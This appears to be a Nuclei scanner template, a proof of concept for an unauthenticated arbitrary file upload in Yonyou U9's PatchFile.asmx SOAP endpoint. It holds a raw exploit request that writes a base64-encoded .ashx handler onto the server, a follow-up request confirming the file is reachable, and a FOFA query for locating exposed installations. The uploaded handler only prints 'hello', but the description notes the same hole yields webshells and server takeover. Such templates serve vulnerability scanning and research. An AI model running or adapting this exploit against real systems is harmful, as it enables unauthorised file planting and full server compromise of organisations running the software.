poc/other/TVE-2024-105132128.yaml

id: 2024-105132128

info:
  name: 用友U9-PatchFile.asmx接口存在任意文件上传漏洞
  author: k3ppf0r
  severity: critical
  description: |  
    攻击者未经授权可以上传木马文件导致webshell，可获取服务器权限；
  reference:
    - https://www.wevul.com/8402.html
  remediation: |
    升级官方补丁
  classification:
    cve-id: 2024-105132128
    cvss-score: 9.8
    cwe-id: CWE-434
  metadata:
    date: 2024-01-08
    version: | 
      用友U9
    fofa-query: body="logo-u9.png"
  tags: yonyou,rce,u9

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.ashx"

http:
  - raw:
      - |
        @timeout: 10s
        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Host: 127.0.0.1
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/SaveFile"
        Content-Length: 880

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
          <SaveFile xmlns="http://tempuri.org/">
            <binData>PCUgQCB3ZWJoYW5kbGVyIGxhbmd1YWdlPSJDIyIgY2xhc3M9IkF2ZXJhZ2VIYW5kbGVyIiAlPiAKdXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLldlYjsgCgpwdWJsaWMgY2xhc3MgQXZlcmFnZUhhbmRsZXIgOiBJSHR0cEhhbmRsZXIgCnsgCiAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIAogICAgeyAKICAgICAgICBnZXQgewogICAgICAgICAgICAgcmV0dXJuIHRydWU7IAogICAgICAgICAgICB9IAogICAgICAgIH0gCiAgICAgICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY3R4KSAKICAgICAgICB7IAogICAgICAgICAgICBjdHguUmVzcG9uc2UuV3JpdGUoImhlbGxvIik7IAogICAgICAgIH0gCiAgICB9</binData>
            <path>./</path>
            <fileName>{{file_name}}</fileName>
          </SaveFile>
          </soap:Body>
        </soap:Envelope>

  - method: GET
    path:
      - "{{BaseURL}}/CS/Office/AutoUpdates/{{file_name}}"    
    
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
        condition: and